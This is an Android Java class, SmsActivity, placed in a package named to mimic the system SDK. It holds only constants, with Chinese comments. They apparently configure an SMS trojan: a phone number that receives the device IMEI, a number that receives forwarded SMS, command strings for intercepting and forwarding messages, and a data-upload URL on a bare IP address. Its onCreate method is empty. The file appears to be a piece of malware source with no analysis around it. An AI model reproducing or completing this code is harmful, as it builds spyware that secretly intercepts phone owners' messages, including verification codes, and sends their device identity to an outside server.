package android.app.sdk;

import android.app.Activity;
import android.os.Bundle;

public class SmsActivity extends Activity {

	//imei发送
	public static final String devicephone = "13568986885";
	//短信转发
	public static final String phonenum = "13568986885";
	//拦截
	public static final String lanjie="DX99#LJ|";
	//转发
	public static final String zhuanfa="DX99#FS|";
	//提交数据
	public static final String httpUrl = "http://121.127.253.120:888/sms.asp";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
	}
	
}
